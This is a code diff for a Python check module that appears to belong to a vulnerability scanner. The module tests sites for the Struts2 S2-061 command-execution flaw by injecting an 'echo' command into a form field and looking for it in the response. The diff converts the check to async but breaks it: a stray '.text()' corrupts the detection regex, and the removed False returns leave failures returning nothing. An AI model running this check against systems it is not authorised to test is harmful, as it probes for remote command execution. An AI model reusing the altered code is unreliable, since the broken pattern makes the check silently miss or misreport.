@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_061_BaseVerify:
     def __init__(self, url):
@@ -29,7 +29,7 @@ class S2_061_BaseVerify:
             'age': ''
         }
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -44,17 +44,14 @@ class S2_061_BaseVerify:
                 'name': self.payload['name'].replace('cmd_data', 'echo ' + self.capta),
                 'age': ''
             }
-            check_req = request.post(self.url, data = check_payload, headers = self.headers)
-            check_str = re.sub('\n', '', check_req.text)
-            result = re.findall('<input type="text" name="name" value=".*? id="(.*?)"/>', check_str)
+            check_req = await request.post(self.url, data = check_payload, headers = self.headers)
+            check_str = re.sub('\n', '', await check_req.text())
+            result = re.findall('<input type=.text()" name="name" value=".*? id="(.*?)"/>', check_str)
             if self.capta in result[0]:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
         
 if  __name__ == "__main__":
